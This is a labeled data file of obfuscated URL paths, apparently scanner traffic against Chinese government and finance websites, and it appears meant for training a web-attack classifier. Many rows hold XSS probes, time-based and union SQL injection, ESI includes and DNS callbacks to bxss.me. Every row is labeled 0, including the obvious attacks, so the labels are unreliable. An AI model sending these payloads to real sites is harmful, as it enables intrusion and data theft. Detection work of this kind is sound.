sentences	labels
xxgk/******/tjj/tjjysqgk/gkcx/list.html?new="".gethostbyname(lc(""hitbn"".""qyiysvkz958f5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(109).chr(78).chr(106).chr(80)."" 	 0
ztzl/********/hdnr/ 	 0
qhsw/******/2021/04/22'"/><img src=javascript:alert(2402) /013373702.shtml 	 0
publish/*****/10690/20577/javascript:; 	 0
about-southwest/******/2021-10-14/10953.html 	 0
kjcx/****/' and 'x'='y 	 0
index/******/2021/12/04/javascript:void(); 	 0
inc/******/common/newaccount.aspx?ddlculture=alert(777) 	 0
zwgk/czgk'""()&%<acx><script >5vc5(9837)</script>/****/gdyx/ 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(550)</script>?_=1630311515828 	 0
'.gethostbyname(lc('hitrp'.'roxjmtjqc1f52.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(81).chr(111).chr(73).'/*****/1088/1105/list.html 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(470)</script>?_=1630311423453 	 0
kjcx/****/gcdzyqzysjx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
xwdt/****/1.htm 	 0
zwgk/******/bzxajgc/gys/jyx'||'.htm 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(727)">?_=1630311565792 	 0
hdjl/****/202103/t20210303_'""()&%<acx><script >0gna(9822)</script>.html 	 0
was5/***/search?channelid=299868&perpage=1000' and 7423=7423  	 0
ztpd/*********/hdzx/javascript:void(0); 	 0
e/******/viewclick/getall.php?classid=0'xor(if(now()=sysdate(),sleep(9),0))xor'z 	 0
pic/******/common/newaccount.aspx?btncancel=alert(777) 	 0
enclosure/************/data_back.php 	 0
news/********/yanjiubaogao?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 0
vc/**/widgets/hanweb'||'/placeholder/css/placeholder.css 	 0
zwgk/*****/5620/5642/\"javascript:void(0)\" 	 0
hdjl/****/http://bxss.me/t/fit.txt?.jpg/t20210303_2614145.html 	 0
newscenter/******/2021/11/02/javascript:void(); 	 0
index/******/2015/06/14/javascript:void(); 	 0
col/*****/index.html"" and ""x""=""y 	 0
module/**********/visit.jsp?i_webid[0]==2"and/**/extractvalue(1,concat(char(126),md5(1624595784)))and"and 3 in &i_columnid=1&i_webid[1]=3&type=1 	 0
rssdy/****/gallery1.php?g_name=<script>alert(77729</script> 	 0
61/********/xhr_send?t=1629433371354 	 0
jsearchfront/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1<esi:include src=""http://*******/rpb.png""/>&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') or 8524=8524  	 0
kjcx/****/zdkjcg/ and 1=1 	 0
zwgk/****/bmyjs/zzqfyxt/hnqrmfy/\"javascript:void(0)\" 	 0
qywh/****/jzgj/ 	 0
zwgk/****/bmjs/zzqfyxt/xxqrmfy/\"javascript:void(0)\" 	 0
newscenter/******/2021/09/07'"/><iframe src=javascript:alert(788) /013447361.shtml 	 0
bxss.me/********/jcse/110105008056111/16/images/plugin/category/js.js 	 0
newscenter/******/2021/09/07'"/><img src=javascript:alert(813)>/013447361.shtml 	 0
jinronglicai/*******/contact-us'||'/2017-01-24/193.html 	 0
module/********/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc and 5314=6198 	 0
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/wzs/hsbq/xmb_gzdxb.htm 	 0
news/********/quanqiuguanzhuredian?page=1' or 5615=5615 /* 	 0
prn/*********/index/41730?did=4&period=3"">alert(/777/) 	 0
xwdt/****/csjs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/1.htm 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 0937=5410 and '1'='1 	 0
xxgk/******/201912/t20191216_240557.html' and 'x'='y 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24' and 7431=2165 and '1'='1&templet=1&token=1 	 0
cgi-bin/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
z/210514-1/*****/'""()&%<acx><script >rsbr(9513)</script>aa5449bf388d846409a3d11e199a08.css 	 0
xxgk/******/tjj%' and 2*3*8=6*8 and 'aw2d'!='aw2d%/ 	 0
'""()&%<acx><script >wopg(9339)</script>/**/widgets/scrollup/js/jquery.scrollup.min.js 	 0
modules/*******/path.php 	 0
system/********/code/datainput.jsp?owner=%' and 3723=0578 and '%%'='% 	 0
template/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
com1/**********/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> 	 0
ztpd/******/wlwm/javascript:void(0); 	 0
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/index.html 	 0
system/********/js/image%' and 2*3*8=6*8 and 'dtm6'!='dtm6%/imagescroll.js 	 0
xwzx/********/javascript:void(0); 	 0
vc/**/css'||'/page.css 	 0
news/********/fazhanzhanlue?page=1 and 8674=5211# 	 0
ztpd/******/count/0036001/008000000000/window.location.href 	 0
xwzx/****/2021_jtyw/202108/t20210819_314634.html and 1=1 	 0
zwgk/******/bzxajgc%' and 2*3*8=6*8 and 'pvd1'!='pvd1%/ycs/hlx.htm 	 0
module/**********/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1153603843')))&i_columnid=15&i_webid=1&type=3 	 0
/***********/5/xys.css 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4659)">?_=1630312093914 	 0
news/********/zijinqudao?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(19619)</script> 	 0
xxgk/'.gethostbyname(lc('hitxi'.'uisbjptq2376f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(74).chr(118).chr(75).'/****/1105/list.html 	 0
xinanyanjiu/jinrongqihuo'||'/**********/ 	 0
zmhd/*****/hfswsj' and 2*3*8=6*8 and '734u'='734u/zmhdyc.html 	 0
jsearchfront"" and 2*3*8=6*8 and ""wce0""=""wce0/********/jcse/110105008056111/16/images/searchbtn.js 	 0
xwzx/****/2016hydt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
bxss.me/****/202001/t20200119_146666.html 	 0
libs/*********/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 0
news/********/siluyiliao?page=1 and 8605=8605# 	 0
cms/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=minsheng¤tpage=&columnarticlelistdeal_4g4_channelid_ss=channelid<alert(88952634)> 	 0
qhly/******/2021/11/10/javascript:dozoom(12) 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/1.htm 	 0
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/202107/t20210723_2938511.html 	 0
vc/**/lib/http://bxss.me/t/fit.txt?.jpg/themes/bootstrap/linkbutton.css 	 0
col/*******/index.html"" and ""x""=""x 	 0
ztpd/**********/images/ 	 0
if(now()=sysdate(),sleep(12),0)/****/jsgcxfjg/gzdt.htm 	 0
xq/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
con/*********/plugins/handwrite/index.php?id="">alert(777) 	 0
index/******/2020/11/21/javascript:window.print() 	 0
was5/***/search?channelid=299868' and 7461=6510  	 0
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &token=1 	 0
was5/***/search?channelid=299868%' or 6226=2695 and '%%'='%&perpage=1000 	 0
xwzx/****/jtwxq/" and "x"="y 	 0
jsearchfront%' and 2*3*8=6*8 and '2rdf'!='2rdf%/********/jcse/110105008056111/16/images/css.js 	 0
fr/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 0
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/list<esi:include src=""http://bxss.me/rpb.png""/>.html 	 0
rssdy/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 0
news/********/jishuchuangxin?page=1' or 7062=7062 /* 	 0
newscenter/******/2014/11/28/011568963.shtml 	 0
zwgk'""()&%<acx><script >vtjw(9478)</script>/****/bmjs/qtdw/ 	 0
images/******/common/newaccount.aspx?email=alert(777) 	 0
wzdt/************/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 	 0
system/********/interview/room.jsp?wbinterviewid=1033') and 7139=0711 and '1'='1&owner=1707212448 	 0
qhly/******/2016/08/29/javascript:window.close(); 	 0
news/********/redianguanzhu?page=1 and 5761=5761# 	 0
news/********/guojialingdaoren 	 0
xwdt/****/if(now()=sysdate(),sleep(12),0)/gzdt/145.htm 	 0
2017zt/******/2017/10/28/javascript:window.close(); 	 0
images/*/phone.js/"><script>alert(7549)</script> 	 0
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/******/tjj/ 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10*/-->'""></iframe></script></style></title></textarea><script >alert(75666)</script> 	 0
ztzl/****/bsap/ and 1=1 	 0
z/***/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 0
2013zt/***/js/jquery-1.4a2.min.js/"><script>alert(47)</script> 	 0
database/**/editor/third-party/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
xinanyanjiu/*************/nongchanpin/2021-0'xor(if(now()=sysdate(),sleep(12),0))xor'z-14/1705.html 	 0
news/********/yidaiyilubaike?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 0
qhly/******/2007/08/08/javascript:window.close(); 	 0
zwgk/****/bmyjs/zzqfyxt/ycxzjrmfy/\"javascript:void(0)\" 	 0
zxgg/********/javascript:void(0); 	 0
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/kjybzde/gzdt/1.htm 	 0
aux/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 0
xwzx/****/2015_mtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
was5/***/search?channelid=-1) or 9367=9367#&perpage=1000 	 0
col/*****/index.html/"><script>alert(468)</script> 	 0
system/resource%' and 2*3*8=6*8 and 'u44k'!='u44k%/**/language.js 	 0
zwgk/zdlygk'||'/********/gys/bsj/zcwj.htm 	 0
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jquery/jquery-latest.min.js 	 0
xwzx/****/2019_mtgz/' and 'x'='y 	 0
art/****/3/12/art_31_17187.html 	 0
con/****/tipsloginsubmit.action 	 0
fxgg/********/javascript:void(0); 	 0
nbfw/*******/diary/new/submit.php 	 0
xxgk/*******/ybjsqzn/list.html 	 0
pic/*/00/75/28/752802_538638.jpg 	 0
template/*******/diary/new/submit.php 	 0
jsearchfront/********/'""()&%<acx><script >f58x(9015)</script>/110105008056111/16/images/plugin/websitechange/zwdt_v3.css 	 0
2016zt/******/2016/12/22/javascript:void(); 	 0
module/***/rssfeed.jsp?colid=34 and 5511=5511 	 0
news/********/touzizixun 	 0
searchfinancial.jspx?channelid=1480&producttype=2&querystr=1<esi:include src=""http://*******/rpb.png""/>&renew=0&termtype=0 	 0
socket.gethostbyname('hitaf' 'xnpjzolz0be83.bxss.me.')[3].to_s) '/**/images/ui.css 	 0
n42812/******/n42825/n1588869'||'/c1589219/content.html 	 0
lcgg/********/javascript:void(0); 	 0
system/********/interview/room.jsp?wbinterviewid=1033%') or 7793=3910  	 0
zwgk/****/bmjs/zzqzx/zzqzxbgt/\"javascript:void(0)\" 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(522)</script>?_=1630311501948 	 0
bdt/****/index.shtml/<img src="javascript:alert(218)"> 	 0
2017zt/******/2018/01/28/javascript:window.close(); 	 0
lz/******/2021/10/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
/***********/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html 	 0
ztpd/******/2020/06/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
images/*******/hanweb.css 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3608)">?_=1630311970851 	 0
system/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/**/news/newscontent.js 	 0
lcgg1/********/javascript:void(0); 	 0
jsearchfront/********/jcse/'""()&%<acx><script >efoq(9230)</script>/16/images/hanweb.css 	 0
zmhd/*****/"".gethostbyname(lc(""hitts"".""cglllteue3abf.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(84).chr(110).chr(82).""/zmhdyc.html 	 0
vc/ui"" and 2*3*8=6*8 and ""tj15""=""tj15/***/easyui/themes/bootstrap/messager.css 	 0
lz/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
system/if(now()=sysdate(),sleep(12),0)/**/news/newscontent.js 	 0
e/******/viewclick/?addclick=-1; waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163 	 0
ywly/*****/' and 'x'='y 	 0
xwdt/zjdt'||'/****/gzdt/1.htm 	 0
was5/***/search?searchword=1&channelid=287219' or 4517=4517  	 0
newscenter/******/2010/02/23/010065617.shtml 	 0
module/*****/if(now()=sysdate(),sleep(15),0)/jquery.ad-gallery2.css 	 0
zwgk/******/ncwywfgz/zws'||'/znx/xmb_gzdxb.htm 	 0
2016zt/******/2016/12/19/javascript:window.print() 	 0
qhly/******/2017/04/05/javascript:dozoom(14) 	 0
qhly/******/2020/12/03/javascript:window.print() 	 0
'""()&%<acx><script >sm0f(9391)</script>/******/2013/list.html 	 0
2021zt/******/2021/12/21/javascript:window.close(); 	 0
pic/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 0
system/********/interview/room.jsp?wbinterviewid=1033%' or 6318=6318 and '%'='&owner=1707212448 	 0
zwgk/czgk'""()&%<acx><script >vtjw(9973)</script>/****/qtdw/ 	 0
z/210514-1/*****/bxss.me/t/xss.html? 	 0
newscenter/******/2021/11/04/javascript:void(0); 	 0
xxgk/******/tjj/zfxxgkml_2127/http://bxss.me/t/xss.html? 	 0
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=0.6905497045448936<esi:include src=""http://bxss.me/rpb.png""/> 	 0
kefuzhongxin/common-problem/****/2017-0'xor(if(now()=sysdate(),sleep(6),0))xor'z-15/406.html 	 0
xq/******/2020/11/11/javascript:void(0); 	 0
index/******/2020/12/01/javascript:void(0); 	 0
ztzl/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 0
'""()&%<acx><script >gva8(9790)</script>/*****/1088/1105/list.html 	 0
/***********/bysrd/201610/t20161016_531.html 	 0
e/******/viewclick/?addclick=1&classid=if(now()=sysdate(),sleep(9),0)&id=270 	 0
index/******/2021/12/10/javascript:void(0); 	 0
swld/******/2021/08/15/javascript:window.print() 	 0
en/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
qhsw/******/2020/04/01/javascript:void(); 	 0
socket.gethostbyname('hitwm' 'urffjzqs11013.bxss.me.')[3].to_s) '/******/list.html 	 0
lcgg/********/javascript:void(0); 	 0
ru/************/index?search="">alert(/777/) 	 0
js/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 0
socket.gethostbyname('hitne' 'cqvoatbv27e82.bxss.me.')[3].to_s) '/******/index.html 	 0
qhly/******/2016/04/15/javascript:window.print() 	 0
english/*******/art/index.shtml/"><script>alert(59)</script> 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 3900=8789 and '%'=' 	 0
ztzl/******/djbn_jthd/ 	 0
zwgk'||'/******/gytdsdfwzs/zzq/zcwj.htm 	 0
template/*************/ajax_managed_services.php 	 0
sites/*******/files/opn-post.php 	 0
xxgk/******/tjj/zfxxgkml_http://bxss.me/t/fit.txt?.jpg/hygq_2064/list.html 	 0
system/********/js/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jquery-latest.min.js 	 0
xinanyanjiu/*************/heisebankuai/2021-06-16/javascript:void(0) 	 0
xxgk/******/201812/t20181213_198700.html' and 'x'='y 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4988)">?_=1630312235646 	 0
zzsl'||'/******/202107/t20210723_2938511.html 	 0
upload/***/www/201607/15171839f46w.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(46364)</script> 	 0
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js 	 0
zfld/******/2021/11/30/javascript:window.close(); 	 0
xxgk/*****/1088/1110/bxss.me/t/xss.html? 	 0
2010zt/******/db/index.shtml/<img src="javascript:alert(539)"> 	 0
hdjl/****/\"javascript:void(0)\" 	 0
newscenter/******/2020/12/06/javascript:void(); 	 0
zmhd/*****/hfswsj/202109/t20210906_http://bxss.me/t/fit.txt?.jpg.html 	 0
socket.gethostbyname(""hitkh"" ""ibbotibv8416c.bxss.me."")[3].to_s) ""/**/lib/easyui/plugins/jquery.window.js 	 0
zwgk/*******/zfxxgkzd'||'/1.htm 	 0
vc/**/widgets/scrollup/css/if(now()=sysdate(),sleep(15),0)/image.css 	 0
module/********/down.jsp?i_id=194814&colid=72;select sleep(5) 	 0
_nuxt/********/select/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
rlzy/****/202010/t20201009_254278.html" and "x"="x 	 0
images'||'/***/main.css 	 0
ddjs/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
zfld/javascript:window.external.addfavorite('http://**************/zfld/','中共青海省委领导活动报道集');?wsdl 	 0
jsearchfront//***********/jcse/website.js 	 0
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/*******/jquery.linkbutton.js 	 0
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/\"javascript:void(0)\" 	 0
index/******/2021/11/17/javascript:window.close(); 	 0
ztpd/******/count/0036001/017000000000/window.location.href 	 0
jsearchfront/********/jcse/110105008056111/16//xfs.bxss.me/main.css 	 0
bdt/******/2008/08/19/002581566.shtml 	 0
hqxx/********/e100963670.html 	 0
ztpd/******/common/newaccount.aspx?email=alert(777) 	 0
module/**********/visit.jsp?i_columnid=1&i_webid=1&type=1' and 'x'='y 	 0
wp-content/*******/azonpop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000group_concat(unhex(hex(md5(1234))),0x3c2f62723e,unhex(hex(md5(1234))))*/,4,5 /*!00000from*/ wp_users 	 0
lcgg/********/javascript:void(0); 	 0
xinanyanjiu/*************/nongchanpin/2021-01-14/if(now()=sysdate(),sleep(12),0).html 	 0
index/******/2013/01/16/011001919.shtml 	 0
com1/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
xxgk/******/tjj/zfxxgkml_'""()&%<acx><script >8m5j(9133)</script>/xwfbh_2065/list.html 	 0
swwj/******/2021/08/04/javascript:void(0); 	 0
xxgk/*****/1088/1091/list.html?new='.gethostbyname(lc('hitxx'.'cjsdturb68be0.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(70).chr(99).chr(77).' 	 0
module'||'/***/jpage/theme/simple/css/jpage.css 	 0
qhly/******/2020/12/04/javascript:dozoom(9) 	 0
xinanyanjiu/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_9.html 	 0
gjcp/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 0
xxgk/*******/t/xss.html? 	 0
qhly/******/2021/11/10/javascript:window.print() 	 0
cgi-bin/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 0
module/**********/visit.jsp?i_columnid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&i_webid=1&type=1 	 0
lxwm/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 0
zwgk/******/ncwywfgz/if(now()=sysdate(),sleep(12),0)/znx/xmb_gzdxb.htm 	 0
kjcx/****/znzgjdqzdhzbyjs/201610/t20161014_103590.html" and "x"="y 	 0
lcgg/********/javascript:void(0); 	 0
sync/*******/download?challenge=</script><script>alert(document.domain)</script> 	 0
ztzl/****/qyddt/202005/t20200527_247881.html and 1>1 	 0
xxgk/http://*******/t/fit.txt?.jpg/tjj/zfxxgkml_2127/jgzn_2042/list.html 	 0
xwzx/****/ 	 0
lcxt/********/javascript:void(0); 	 0
e/******/viewclick/?addclick=-1; waitfor delay '0:0:8.629999999999999' -- &classid=243&id=8977 	 0
xxgk/******//xfs.bxss.me/ 	 0
ldzc/****/http://bxss.me/t/fit.txt/ 	 0
2017zt/******/2017/10/26/javascript:window.print() 	 0
qhsw/******/2021/04/22/013373702'"/>/</script/>/<svg/onload=alert(2568) width=100//>.shtml 	 0
kjcx/****/nljx/201501/t20150129_52356.html and 1=1 	 0
ldzc//***********/sz/202108/t20210806_185416.html 	 0
gjcp/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
newscenter/******/2021/10/22/javascript:void(0); 	 0
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/plugin/voice/voice.css 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(577)</script>?_=1630311519791 	 0
ywly/****/gcsg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
ywly/*****/index.html?continent=) and 6122=6122# 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1') or 8847=4149  	 0
lz/******/2021/11/28/javascript:void(0); 	 0
ztpd/******/count/0036012/000000000000/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
swwj/******/2021/11/23/javascript:window.print() 	 0
ldzc/*****/202109/t20210924_186864.html?leader="".gethostbyname(lc(""hitit"".""fwzxdcbjfd12d.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(119).chr(90).chr(108).chr(75)."" 	 0
hdjl/****/"".gethostbyname(lc(""hitbh"".""mecchcyl14392.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(79).chr(115).chr(88).""/t20201225_2539623.html 	 0
bi-security-login/login.jsp?msi=false&redirect="><img/***/onerror=alert(document.domain)> 	 0
xwzx/****/2021_jtyw/202109/t20210922_316987.html 	 0
col/*****/index.html"" and ""x""=""x 	 0
was5/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 0
news/********/yanjiubaogao?page=1 and 6245=6245 	 0
jsearchfront/********/jcse'||'/110105008056111/16/images/result.css 	 0
nul/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 0
jsearchfront/********/jcse/110105008056111/16/images<esi:include src=""http://bxss.me/rpb.png""/>/jquery.waterfall.js 	 0
con/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
xxgk/******/tjj/zfxxgkml_2127/jgzn_2042/http://bxss.me/t/fit.txt.html 	 0
vc"" and 2*3*8=6*8 and ""jtyk""=""jtyk/**/css/page.css 	 0
zwgk/******/ncwywfgz/zws/znx/xmb_gzdxb'||'.htm 	 0
zwgk/****/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\"javascript:void(0)\" 	 0
xxgk/******/2011/list.html?new=bxss.me 	 0
images' and 2*3*8=6*8 and 've9c'='ve9c/***/lmy.css 	 0
e/******/viewclick/?addclick=1&classid=laytm9rz'; waitfor delay '0:0:13.707' -- &id=10226 	 0
vc/ui%' and 2*3*8=6*8 and '3zv1'!='3zv1%/***/security/crypto-js.js 	 0
xinanyanjiu/shangpinqihuo' and 2*3*8=6*8 and 'sgla'='sgla/***********/2021-01-14/1705.html 	 0
2021zt/******/2021/06/09/013399706'""/>\</script\>\<svg/onload=alert(2342) width=100\/>.shtml 	 0
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&searchid=1&tpl=16&websiteid=110105008056111 	 0
system/********/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/news/newscontent.js 	 0
module/********/downfile.jsp?classid=0%' and 4469=1830 and '%'='&filename=5304f109c5a94f8296864a137b39f53b.xls 	 0
skin/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*********/jsencrypt.min.js 	 0
index/******/2021/11/05/javascript:void(0); 	 0
qhly/******/2009/08/03/javascript:window.print() 	 0
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061<esi:include src=""http://bxss.me/rpb.png""/>/list.html 	 0
'.gethostbyname(lc('hitrw'.'eneyvzki6c789.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(72).chr(112).chr(88).'/*******/ybjsqzn/list.html 	 0
jsearchfront/http://*******/t/fit.txt/jcse/110105008056111/16/images/main.css 	 0
zwgk/****/bmjs/zzqfyxt/szsszjrmfy/\"javascript:void(0)\" 	 0
xwdt/****/czjs/zcwj/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3499)">?_=1630311909102 	 0
fr/***/sources?resource=alert(/777/)&format=txt 	 0
qhly/******/2016/11/14/javascript:dozoom(9) 	 0
vc/**/lib/easyui/'""()&%<acx><script >8uvj(9915)</script>/jquery.window.js 	 0
socket.gethostbyname(""hithd"" ""erqdcurh149e4.bxss.me."")[3].to_s) ""/**/images/result.css 	 0
2020zt/******/2020/07/07/javascript:void(); 	 0
newscenter/******/2012/08/28/010867969.shtml 	 0
index/******/2019/09/26/javascript:void(0); 	 0
hqxx/********/e102801418.html 	 0
2016zt/******/2016/09/14/javascript:window.print() 	 0
newscenter/******/2013/08/16/011161502.shtml 	 0
col/******/index.html/"><script>alert(442)</script> 	 0
module/jslib' and 2*3*8=6*8 and 'xont'='xont/********/jquery.ad-gallery2.css 	 0
images/*/hanweb'""()&%<acx><script >mnpf(9819)</script>.css 	 0
art/****/10/11/art'||'_34_242320.html 	 0
qhly/******/2016/03/29/javascript:dozoom(14) 	 0
investors-garden/***/if(now()=sysdate(),sleep(12),0)_2.html 	 0
ldzc/****/202007/t20200701_168744.html?leader="".gethostbyname(lc(""hitow"".""jojiqievcadbd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(90).chr(106).chr(67)."" 	 0
jsearchfront/********/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt?.jpg/selectpick/css.css 	 0
module/**********/visit.jsp?i_articleid=242318&i_columnid=34&i_webid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&type=3 	 0
was5/***/search?page=2&channelid=253477&searchword=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
lcgg1/********/javascript:void(0); 	 0
x241/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 0
xwdt/zjdt'||'/****/gzdt.htm 	 0
